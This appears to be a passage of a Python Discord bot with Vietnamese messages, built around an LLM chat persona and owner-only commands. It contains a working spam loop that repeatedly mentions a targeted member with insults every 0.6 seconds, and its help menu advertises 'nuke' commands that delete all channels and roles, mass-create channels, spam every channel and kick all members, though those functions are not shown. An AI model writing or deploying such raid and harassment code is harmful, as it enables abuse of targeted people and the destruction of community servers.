            f"👑 Theo sắc lệnh của **Boss Bảo**, chiến dịch lôi đài trừng phạt mục tiêu {member.mention} chính thức bắt đầu trong không gian rực lửa GENIUS AI 4.0! 🔥🖕\n\n"
            f"📌 Gõ lệnh `l!stop` bất cứ lúc nào nếu Boss muốn đình chỉ chiến dịch này."
        ),
        color=0xFF69B4
    )
    await ctx.send(embed=embed_notice)

    async def spam_loop():
        try:
            while True:
                if custom_text:
                    msg = f"{member.mention} {custom_text}"
                else:
                    template = random.choice(ROAST_LINES)
                    msg = template.format(username=member.mention)
                
                await ctx.send(msg)
                await asyncio.sleep(0.6)
        except discord.Forbidden:
            print("[SPAM ERROR]: Bot bị mất quyền (Missing Access) tại kênh này!")
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"[SPAM ERROR]: {e}")

    spam_task_running = bot.loop.create_task(spam_loop())

@spam.error
async def spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')

@bot.command(name="stop")
@is_bot_owner()
async def stop_bot(ctx):
    global bot_stopped, is_spamming, spam_task_running
    bot_stopped = True
    is_spamming = False  
    if spam_task_running:
        spam_task_running.cancel()
        spam_task_running = None

    embed = discord.Embed(
        title="🛑 ĐÃ PHANH GẤP VÀ DỪNG TOÀN BỘ HOẠT ĐỘNG, LÔI ĐÀI SPAM THEO LỆNH BOSS BẢO",
        description="🎀 Mọi tác vụ tự động, lôi đài chửi và phản hồi AI đã được đóng băng hoàn toàn trong sự yên bình GENIUS AI 4.0. ✨",
        color=0xFF0000
    )
    await ctx.send(embed=embed)

@stop_bot.error
async def stop_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')

@bot.command(name="on")
@is_bot_owner()
async def bot_on(ctx):
    global current_persona_id, last_active_persona_id, bot_stopped, is_spamming
    
    bot_stopped = False
    is_spamming = False
    current_persona_id = last_active_persona_id
    
    if isinstance(current_persona_id, int) and current_persona_id in PERSONAS:
        p_name = PERSONAS[current_persona_id]['name']
    else:
        p_name = "Nhân cách tùy chỉnh của thành viên ✨"
        
    embed = discord.Embed(
        title=f"🟢 HỆ THỐNG ĐÃ ĐƯỢC TÁI KÍCH HOẠT THÀNH CÔNG RỰC RỠ",
        description=f"👑 Theo chỉ thị của **Boss Bảo**, toàn bộ kênh chat AI và không gian GENIUS AI 4.0 đã hoạt động trở lại với trạng thái: **{p_name}** 🌸✨",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot_on.error
async def bot_on_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')

@bot.command(name="off")
@is_bot_owner()
async def bot_off(ctx):
    global current_persona_id
    current_persona_id = None
    embed = discord.Embed(
        title="🔌 ĐÃ TẠM THỜI ĐÓNG BĂNG KÊNH PHẢN HỒI CHAT AI",
        description="🎀 Theo lệnh của Boss Bảo, tính năng trò chuyện tự động của AI đã được tắt tạm thời để giữ không gian tĩnh lặng GENIUS AI 4.0. ✨",
        color=0xFF9900
    )
    await ctx.send(embed=embed)

@bot_off.error
async def bot_off_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')

@bot.command(name="ban")
@is_bot_owner()
async def ban(ctx, member: discord.Member = None, *, reason="Boss Bảo không nêu rõ lý do cụ thể"):
    if member is None:
        embed = discord.Embed(
            title="⚠️ THIẾU THÔNG TIN THÀNH VIÊN CẦN TRỤC XUẤT",
            description="🎀 Kính thưa Boss Bảo, vui lòng tag tên thành viên cần trục xuất khỏi vương quốc GENIUS AI 4.0. Ví dụ: `l!ban @user [lý do]`",
            color=0xFF007F
        )
        await ctx.send(embed=embed)
        return
    try:
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="🔨 TRỤC XUẤT THÀNH VIÊN KHỎI VƯƠNG QUỐC GENIUS AI 4.0 THÀNH CÔNG",
            description=f"👑 Mục tiêu {member.mention} đã bị trục xuất vĩnh viễn theo lệnh của **Boss Bảo**.\n📌 **Lý do:** `{reason}`",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
    except Exception:
        embed = discord.Embed(
            title="❌ KHÔNG THỂ THỰC THI LỆNH TRỤC XUẤT",
            description="🥺 Ôi Boss ơi, mục tiêu này có chức vụ/vai trò cao hơn hoặc bằng bot, hoặc bot đang bị thiếu quyền hạn trong server mất rồi!",
            color=0xFF0000
        )
        await ctx.send(embed=embed)

@ban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')

@bot.command(name="stats")
async def stats(ctx):
    guild = ctx.guild
    
    if isinstance(current_persona_id, int) and current_persona_id in PERSONAS:
        p_name = PERSONAS[current_persona_id]['name']
    else:
        p_name = "Nhân cách tùy chỉnh của thành viên ✨"
    
    total_members = guild.member_count
    bots = sum(1 for m in guild.members if m.bot)
    humans = total_members - bots
    
    text_channels = len(guild.text_channels)
    voice_channels = len(guild.voice_channels)
    categories = len(guild.categories)
    total_channels = len(guild.channels)
    
    roles_count = len(guild.roles)
    owner = guild.owner.mention if guild.owner else "Không rõ"
    
    embed = discord.Embed(
        title=f"📊 THÔNG SỐ CHI TIẾT KHÔNG GIAN MÁY CHỦ TRONG GENIUS AI 4.0",
        description=(
            f"🏰 **Tên máy chủ:** `{guild.name}`\n"
            f"🆔 **ID máy chủ:** `{guild.id}`\n"
            f"👑 **Chủ thực quyền tối cao:** {owner}\n"
            f"🌸 **Bảo trợ độc quyền:** Boss Bảo yêu quý ✨\n"
            f"🎀 **Trạng thái AI:** `{p_name}`"
        ),
        color=0xFF69B4
    )
    
    embed.add_field(
        name="👥 Thống kê nhân sự",
        value=f"• Tổng cộng: `{total_members}`\n• Con người: `{humans}`\n• Bot hệ thống: `{bots}`",
        inline=True
    )
    
    embed.add_field(
        name="📁 Kiến trúc & Phân khu",
        value=f"• Tổng kênh: `{total_channels}`\n• Kênh văn bản: `{text_channels}`\n• Kênh thoại: `{voice_channels}`\n• Danh mục: `{categories}`\n• Vai trò: `{roles_count}`",
        inline=True
    )
    
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
        
    embed.set_footer(text=f"Truy vấn bởi {ctx.author.name} • Cung kính phục vụ Boss Bảo & Cộng đồng trong GENIUS AI 4.0 ⚡", icon_url=ctx.author.display_avatar.url)
    
    await ctx.send(embed=embed)

@bot.command(name="setlognuke")
@is_bot_owner()
async def setlognuke(ctx, channel: discord.TextChannel = None):
    """Thiết lập kênh log cho lệnh nuke: l!setlognuke #channel"""
    global NUKE_LOG_CHANNELS
    if channel is None:
        channel = ctx.channel
    NUKE_LOG_CHANNELS[ctx.guild.id] = channel.id
    embed = discord.Embed(
        title="📋 Đã thiết lập kênh log nuke",
        description=f"Kênh log nuke sẽ là {channel.mention}",
        color=0x00CCFF,
        timestamp=discord.utils.utcnow()
    )
    embed.set_footer(text=f"Lệnh bởi {ctx.author.name}")
    await ctx.send(embed=embed)

@bot.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="📖 CẨM NANG ĐIỀU HÀNH TỐI TÂN & DÀI DÒNG - HỆ THỐNG GENIUS AI 4.0 🌸",
        description=(
            "Chào mừng toàn thể thần dân và các thành viên đến với bảng cẩm nang hướng dẫn chi tiết, dài dòng và lộng lẫy nhất trong không gian GENIUS AI 4.0 rực rỡ của **Sun Flower AI**. "
            "Toàn bộ hệ thống được xây dựng và tối ưu hóa với quyền lực tối thượng thuộc về **Boss Bảo**.\n\n"
            "Dưới đây là danh sách đầy đủ các lệnh:\n\n"
            "🎮 **KHU VUI CHƠI DÀNH CHO TẤT CẢ MEMBER:**\n"
            "• `l!work` - Kiếm coin GENIUS AI 4.0 qua 50 kịch bản làm việc ngẫu nhiên 🪙\n"
            "• `l!setpersona [yêu cầu]` - Dùng 5000 coin để tùy chỉnh nhân cách bot theo ý muốn ✨\n\n"
            "⚙️ **CÁC LỆNH ĐIỀU HÀNH & NUKES (ĐỘC QUYỀN BOSS BẢO):**\n"
            "• `l!setup` - Khởi tạo bảng điều khiển trung tâm\n"
            "• `l!persona <1|2>` - Đổi nhân cách bot\n"
            "• `l!spam @user [nội dung]` - Lôi đài spam tốc độ cao\n"
            "• `l!stop` - Dừng tất cả hoạt động spam\n"
            "• `l!on` / `l!off` - Bật/tắt phản hồi tự động của bot\n"
            "• `l!stats` - Xem thông số server\n"
            "• `l!ban @user [lý do]` - Trục xuất thành viên\n"
            "• `l!addowner @user` - Thêm Owner bot\n"
            "• `l!deleteowner @user` - Xóa Owner bot\n"
            "• `l!nuke` - Xóa kênh, tạo 100 kênh mới, spam, đổi tên và avatar\n"
            "• `l!spamchannels [số lượng]` - Tạo nhiều kênh spam\n"
            "• `l!spameveryone` - Spam thông điệp trong tất cả kênh text\n"
            "• `l!deleteallchannels` - Xóa tất cả kênh\n"
            "• `l!spamroles [số lượng]` - Tạo role spam\n"
            "• `l!deleteallroles` - Xóa tất cả role\n"
            "• `l!kickall` - Kick tất cả thành viên\n"
            "• `l!setservername [tên mới]` - Đổi tên server\n"
            "• `l!setservericon [url]` - Đổi icon server"
        ),
        color=0xFF69B4
    )
    embed.set_footer(text="Cẩm nang điều hành tối tân • Tôn vinh Boss Bảo & Phủ sóng GENIUS AI 4.0 💖", icon_url=bot.user.display_avatar.url)
    await ctx.send(embed=embed)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, (commands.CommandNotFound, discord.errors.Forbidden)):
        return
    print(f"[ERROR]: {error}")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    await bot.process_commands(message)

    if message.content.startswith(('l!', '.', '/', '?', '@', '#')):
        return

    if bot_stopped or current_persona_id is None or is_spamming:
        return

    try:
        user_id = message.author.id
        
        if str(current_persona_id).startswith("custom_"):
            owner_custom_id = int(current_persona_id.split("_")[1])
            if owner_custom_id in CUSTOM_USER_PERSONAS:
                p_info = CUSTOM_USER_PERSONAS[owner_custom_id]
            else:
                p_info = PERSONAS[1]
        elif current_persona_id in PERSONAS:
            p_info = PERSONAS[current_persona_id]
        else:
            p_info = PERSONAS[1]

        user_msg = message.content.strip() if message.content else "..."
        
        if groq_client:
            chat_completion = groq_client.chat.completions.create(
                messages=[
                    {"role": "system", "content": p_info['instruction']},
                    {"role": "user", "content": user_msg}
                ],
                model="llama-3.1-8b-instant",
                max_tokens=2500,
            )
            ai_reply = chat_completion.choices[0].message.content
        else:
            ai_reply = "⚠️ CHƯA THIẾT LẬP GROQ_API_KEY TRONG BIẾN MÔI TRƯỜNG NHA CƯNG!"

        embed = discord.Embed(
            title=f"✨ {p_info['name']}",
            description=ai_reply,
            color=p_info['color']
        )
        embed.set_footer(text="Hệ thống AI GENIUS AI 4.0 • Độc quyền phục vụ Boss Bảo 💖")

        await message.reply(embed=embed, mention_author=False)

    except Exception as e:
        print(f"[GROQ API ERROR]: {e}")

if __name__ == "__main__":
    bot.run(DISCORD_TOKEN)
